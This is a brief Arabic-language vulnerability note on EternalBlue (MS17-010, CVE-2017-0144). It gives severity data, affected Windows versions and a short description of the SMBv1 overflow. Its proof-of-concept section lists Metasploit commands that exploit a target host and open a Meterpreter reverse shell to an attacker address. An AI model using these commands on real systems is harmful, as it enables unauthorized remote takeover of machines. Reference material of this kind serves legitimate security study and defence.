# MS17-010: EternalBlue SMBv1 RCE

## 1. بيانات الثغرة
| البيانات | القيمة |
| --- | --- |
| **CVE** | CVE-2017-0144 |
| **CVSS v3** | 9.8 Critical |
| **الأنظمة المصابة** | Windows 7, Server 2008 R2, XP, Vista |
| **النوع** | Remote Code Execution |
| **MITRE ATT&CK** | T1210 - Exploitation of Remote Services |

## 2. الوصف التقني
ثغرة Buffer Overflow في بروتوكول SMBv1. المهاجم يبعت حزم SMB مُصممة خصيصاً تنفذ كود على الجهاز الهدف بدون أي Authentication. سُربت من NSA بواسطة Shadow Brokers.

## 3. طريقة الاستغلال PoC
```bash
# Metasploit Module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
